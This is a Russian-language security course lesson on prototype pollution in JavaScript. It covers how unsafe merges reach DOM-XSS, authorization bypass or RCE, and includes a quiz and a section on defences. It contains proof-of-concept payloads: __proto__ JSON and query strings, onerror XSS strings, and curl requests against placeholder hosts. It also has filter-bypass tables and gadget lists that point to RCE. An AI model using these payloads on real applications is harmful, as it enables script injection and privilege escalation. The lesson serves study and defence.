---
id: web-prototype-pollution
title: "Prototype pollution в JavaScript"
category: web
parent: web-xss-bypass-advanced
difficulty: hard
order: 3
tags: [prototype-pollution, javascript, dom, rce, nodejs, merge]
prerequisites: [web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 38
summary: "Как через __proto__/constructor загрязнить прототип Object и дойти до DOM-XSS или RCE на сервере."
---

JavaScript — прототипный язык: объекты наследуют свойства от прототипа. Если приложение неаккуратно «мержит» пользовательские данные в объект, можно записать свойства в `Object.prototype`, и они появятся у **всех** объектов приложения. Это называется **prototype pollution**. На клиенте это ведёт к DOM-XSS, на сервере (Node.js) — к обходу логики и, при удачном наборе библиотек, к RCE.

## Теория: как работает загрязнение

Классическая уязвимость — «глубокий merge» без фильтрации ключей:

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') merge(target[key], source[key]);
    else target[key] = source[key];
  }
}
```

Если в `source` есть ключ `__proto__`, цикл заходит в `target.__proto__` (= `Object.prototype`) и пишет туда:

```json
{"__proto__": {"isAdmin": true}}
```

После этого **любой** объект `{}` «унаследует» `isAdmin: true`, и проверка `if (user.isAdmin)` станет истинной.

Векторы ключей: `__proto__`, `constructor.prototype`, `constructor[prototype]`, а также обходы фильтров (`__pro__proto__to__`, разбиение на части).

## Теория: последствия

**На клиенте (DOM-XSS):** многие библиотеки (jQuery `$.extend`, `lodash.merge`, `deepmerge`) читают опции из прототипа. Загрязнив `Object.prototype`, можно заставить библиотеку вставить HTML/скрипт:

```json
{"__proto__": {"html": "<img src=x onerror=alert(1)>"}}
```

Если потом код делает `$('div').html(opts.html)` и `opts.html` берётся из прототипа — XSS.

**На сервере (Node.js):** загрязнение `Object.prototype` может обойти авторизацию (`isAdmin`), отравить шаблоны, а через **gadget** в популярных библиотеках (child_process, EJS, handlebars, pug) привести к **RCE**. Пример: загрязнение опций `child_process.exec`/`spawn` (`shell`, `argv0`, `env`) даёт выполнение команд.

## Инструменты: обнаружение

Проверить, «мержит» ли эндпоинт произвольные ключи:

```bash
curl -s -X POST https://target.local/api/settings -H 'Content-Type: application/json' \
  -H 'Cookie: session=...' \
  -d '{"__proto__":{"polluted":"yes"}}'
```

Затем запросить объект и проверить наличие свойства:

```bash
curl -s https://target.local/api/settings -H 'Cookie: session=...' | jq '.polluted'
```

Автоматизация: **ppmap** (клиентское сканирование), **server-side-prototype-pollution** (Burp-расширение), **DOM Invader** (в Burp, ищет PP в DOM).

Проверка в браузерной консоли:

```js
Object.prototype.polluted  // undefined до, "yes" после загрязнения
```

## Разобранный пример: клиентский PP → DOM-XSS

Шаг 1. Приложение читает параметры URL и «мержит» их в конфиг. Проверяем:

```
https://app.local/?__proto__[polluted]=yes
```

Шаг 2. В консоли смотрим:

```js
Object.prototype.polluted   // "yes"  => загрязнение работает
```

Шаг 3. Ищем gadget — код, читающий свойство из прототипа. Если есть скрипт вида:

```js
const cfg = merge({}, qs.parse(location.search));
document.querySelector('#box').innerHTML = cfg.html || '';
```

То payload:

```
?__proto__[html]=<img src=x onerror=alert(document.domain)>
```

Даёт DOM-XSS без прямого отражения параметра — CSP/фильтры могут его не поймать.

Шаг 4. Подтверждаем алертом и описываем impact (выполнение JS в контексте сайта).

## Разобранный пример: серверный PP → обход авторизации

Шаг 1. Отправляем:

```bash
curl -s -X POST https://api.local/user/update -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'
```

Шаг 2. Обращаемся к админскому эндпоинту:

```bash
curl -s https://api.local/admin -H 'Cookie: session=user'
```

Если вернулось `200` вместо `403` — загрязнение обошло проверку `if (req.user.isAdmin)`. Это высокий impact (вертикальная эскалация).

Шаг 3. Для RCE ищем gadget-библиотеку (EJS/child_process). Это отдельный, более сложный этап; в отчёте достаточно доказать загрязнение + обход авторизации, а RCE — бонус.

## Частые ошибки

- **Путать клиентский и серверный PP.** На клиенте результат — DOM-XSS; на сервере — обход логики/RCE. Это разные поверхности.
- **Считать, что `__proto__` фильтруется.** Фильтр по строке `__proto__` обходится `constructor.prototype` или регистром/разбиением.
- **Не проверять «отложенный» эффект.** Загрязнение может проявиться только в следующем запросе/на другой странице.
- **Игнорировать JSON и query-параметры.** PP возможен и в `qs`-парсинге URL, и в JSON-мерже.
- **Забывать про `Object.freeze(Object.prototype)`.** Это корректная защита — ищите, применяется ли она.
- **Пытаться валить прод.** RCE-gadget может уронить сервис; проверяйте безопасно.

## Векторы входа: где искать источник загрязнения

Загрязнение возможно только там, где пользовательские данные **рекурсивно** вливаются в объект. Источников несколько:

| Источник | Пример | Клиент/сервер |
|----------|--------|---------------|
| Query string | `?__proto__[isAdmin]=true` | сервер (qs) |
| JSON body | `{"__proto__":{"isAdmin":true}}` | сервер |
| URL fragment | `#__proto__[x]=1` | клиент |
| `window.name` | `name='{"__proto__":...}'` | клиент |
| `postMessage` | `event.data` мержится | клиент |
| localStorage | `JSON.parse` затем merge | клиент |

Типичные «опасные» функции и библиотеки: `$.extend(true, {}, input)` (jQuery), `_.merge`/`_.defaultsDeep` (lodash), `merge`, `deepmerge`, `Hoek.applyToDefaults`, а также самописные рекурсивные merge-функции. Всё, что рекурсивно копирует ключи без фильтра `__proto__`, `constructor`, `prototype`, — потенциальный источник.

## Теория: три ключа, три способа записи

Загрязнить прототип можно тремя путями, и каждый требует своей проверки:

```javascript
// 1) через __proto__
obj.__proto__.polluted = 'yes'
// 2) через constructor.prototype
obj.constructor.prototype.polluted = 'yes'
// 3) через prototype в JSON-ключе
{"constructor":{"prototype":{"polluted":"yes"}}}
```

Защиты часто блокируют только `__proto__` и забывают `constructor.prototype` — это самый частый обход. В URL это выглядит так:

```text
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?__proto__.polluted=yes
```

## Обнаружение: клиентская сторона

Проверка выполняется в консоли браузера и в DevTools. Базовый детект:

```javascript
// 1) отправляем нагрузку через URL/фрагмент и смотрим, что стало с Object
Object.prototype.polluted   // если !== undefined — есть загрязнение

// 2) автоматический сканер с несколькими ключами
const keys = ['__proto__','constructor','prototype'];
keys.forEach(k => console.log(k, Object.prototype[k]));

// 3) проверка конкретного полезного свойства
JSON.stringify({})   // если в выводе появился чужой ключ — загрязнено
```

Для фаззинга удобен **DOM Invader** (встроен в Burp Suite) — он автоматически подставляет `__proto__`-нагрузки в источники (query, fragment, postMessage, localStorage) и показывает, дошли ли они до стока.

## Обнаружение: серверная сторона (Node.js)

На сервере загрязнение видно косвенно. Признаки:

```bash
# 1) поведение, зависящее от несуществующего свойства
curl -s https://api.example/me -H 'X-Api-Version: 1'   # норм
# 2) инъекция ключа через JSON-тело
curl -s -X POST https://api.example/update \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"status":"admin"}}'
# 3) если сервер отвечает {"status":"admin"} на GET /me — загрязнено
curl -s https://api.example/me
```

Часто PP не видно напрямую, но он меняет ветку логики: `if (user.isAdmin)`, `if (options.allowDangerous)`, `JSON.parse` с последующим доступом к унаследованному свойству.

## Разобранный пример: DOM-XSS через PP

Цепочка: PP → небезопасный sink. Многие библиотеки берут «опции» из прототипа.

```javascript
// уязвимый код
const cfg = Object.assign({}, defaults, userInput);
element.innerHTML = cfg.template;   // sink
```

Если `defaults` не задаёт `template`, а мы загрязнили `Object.prototype.template`:

```text
https://app.example/#__proto__[template]=<img src=x onerror=alert(1)>
```

После загрузки скрипта, который мержит fragment в объект, `cfg.template` унаследуется из прототипа и попадёт в `innerHTML`. Для эксплуатации подберите **гаджет**: свойство, которое (а) читается из прототипа и (б) попадает в опасный sink (`innerHTML`, `eval`, `srcdoc`, `href`).

## Обходы фильтров и защит

Санитайзеры и «безопасные» merge часто обходятся:

| Защита | Обход |
|--------|-------|
| Блок `__proto__` | `constructor.prototype` |
| Блок обоих | `prototype` через `Object.defineProperty`-подобный путь |
| Проверка `hasOwnProperty` | загрязнить унаследованное свойство, которого нет «своим» |
| Фильтр на клиенте | сделать merge на сервере или через `postMessage` |
| `Object.create(null)` | не помогает, если merge копирует в обычный объект |
| `JSON.parse` reviver | не помогает без явного удаления `__proto__` |

Дополнительно: обход через `toString`/`valueOf`, через getters, а также через **prototype pollution в `Array.prototype`** (загрязнение `Object.prototype` автоматически затрагивает массивы).

## Гаджеты: как найти и применить

«Гаджет» — это код в приложении или библиотеке, который читает свойство из прототипа и использует его небезопасно. Поиск гаджетов:

```bash
# 1) ищем обращения к потенциально опасным свойствам в JS-бандлах
curl -s https://app.example/app.js -o app.js
grep -oE '\.[a-zA-Z0-9_]+' app.js | sort -u > props.txt
# 2) ищем sinks
grep -nE 'innerHTML|outerHTML|eval|Function\(|srcdoc|insertAdjacentHTML' app.js
```

Известные гаджеты: `script.src` (в некоторых версиях библиотек), `src`/`href` через jQuery, `template`/`compile` в шаблонизаторах, `srcdoc` в iframe-обёртках. На сервере — гаджеты RCE (см. урок `web-prototype-pollution-rce`).

## Что делать дальше / решение

1. **Найдите источник.** Параметр, JSON-тело, fragment, postMessage, localStorage — что мержится в объект.
2. **Проверьте три ключа.** `__proto__`, `constructor.prototype`, `prototype`.
3. **Проверьте на клиенте и сервере.** DOM Invader — для клиента, ручные JSON-запросы — для сервера.
4. **Найдите гаджет.** Свойство, которое читается из прототипа и попадает в sink (XSS) или меняет логику (authz/RCE).
5. **Зафиксируйте PoC.** URL/запрос + наблюдаемый эффект (`alert`, изменение ответа, обход роли).
6. **Проверьте обходы.** Если `__proto__` заблокирован — попробуйте `constructor.prototype`.

## Практика и справочники

- **PortSwigger Academy** — «Prototype pollution» (лаборатории client-side и server-side).
- **PayloadsAllTheThings** — раздел Prototype Pollution (список payload'ов и гаджетов).
- **HackTricks** — «Prototype Pollution» (клиент и Node.js).
- **`ppmap`**, **`pp-finder`** — инструменты поиска гаджетов.

## Расширенная таблица гаджетов и их источников

Гаджет — свойство, которое код читает из прототипа и использует небезопасно. Ниже сводка по распространённым библиотекам и тому, какое свойство в них становится оружием.

| Библиотека/код | Свойство-гаджет | Последствие |
|----------------|-----------------|-------------|
| jQuery `$.extend(true,...)` | `__proto__` | загрязнение объекта опций |
| lodash `_.merge` | `constructor.prototype` | PP в `Object.prototype` |
| Handlebars `compile` | `template`, `compile` | SSTI/DOM-XSS |
| pug/ejs (сервер) | `outputFunctionName` | RCE через `child_process` |
| `JSON.parse` + merge | `toString`/`valueOf` | выполнение при приведении |
| Vue/Angular директивы | `template`, `expression` | клиентский SSTI |
| Node `child_process` опции | `shell`, `env` | RCE при загрязнении опций |

Искать гаджеты удобно полуавтоматически: возьмите JS-бандл, найдите все sinks (`innerHTML`, `eval`, `Function`, `srcdoc`, `require`), а затем проверьте, читается ли управляющее ими свойство из прототипа.

## Защита на уровне кода и её обходы

Правильная защита — не «фильтр строки», а структурные меры:

- Использовать `Object.create(null)` для объектов, в которые мержатся данные, либо `Map`.
- Отвергать ключи `__proto__`, `constructor`, `prototype` **на любом уровне вложенности** (рекурсивно).
- Использовать `JSON.parse` с reviver, удаляющим опасные ключи.
- Заморозить прототипы: `Object.freeze(Object.prototype)`.

Обходы: защита, которая проверяет только верхний уровень, обходится вложенностью (`a[__proto__][x]`); защита, блокирующая `__proto__`, — ключом `constructor.prototype`; защита, срабатывающая после парсинга, — prototype pollution через сам `qs`-парсер до вызова валидатора.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое prototype pollution?"
  options:
    - "Изменение CSS-прототипа"
    - "Запись свойств в `Object.prototype` через небезопасный merge"
    - "Инъекция в SQL"
    - "Кэширование объектов"
  answer: 1
  explanation: "Через `__proto__`/`constructor.prototype` свойства попадают в общий прототип."
- question: "Какой ключ чаще всего используют для загрязнения?"
  options:
    - "`__init__`"
    - "`__proto__`"
    - "`self`"
    - "`prototype__`"
  answer: 1
  explanation: "`__proto__` указывает на прототип; также `constructor.prototype`."
- question: "К чему ведёт клиентский prototype pollution?"
  options:
    - "К RCE на сервере"
    - "К DOM-XSS через gadget-библиотеки"
    - "К SQL-инъекции"
    - "К утечке TLS-ключей"
  answer: 1
  explanation: "Загрязнённые свойства попадают в HTML-санитайзеры/шаблоны → XSS."
- question: "Как обойти наивный фильтр по строке `__proto__`?"
  options:
    - "Никак"
    - "Через `constructor.prototype`"
    - "Через `toString`"
    - "Через `Object.assign` нельзя"
  answer: 1
  explanation: "Ключ `constructor.prototype` ведёт к тому же прототипу."
- question: "Какая защита от prototype pollution корректна?"
  options:
    - "`Object.freeze(Object.prototype)` и фильтрация ключей"
    - "Отключить HTTPS"
    - "Использовать `eval`"
    - "Убрать cookie"
  answer: 0
  explanation: "Заморозка прототипа и запрет опасных ключей при merge."
```

## Где пригодится

- **CTF (Web):** PP часто совмещают с DOM-XSS или обходом авторизации в Node-задачах.
- **Bug bounty:** серверный PP в Node.js-приложениях — высокооплачиваемый класс, особенно с RCE-gadget.
- **Пентест:** тестирование PP входит в проверку SPA и Node-бэкендов.
- **Работа (AppSec/Dev):** ревью merge/parse-функций и запрет `__proto__` — базовая защита JS-кода.
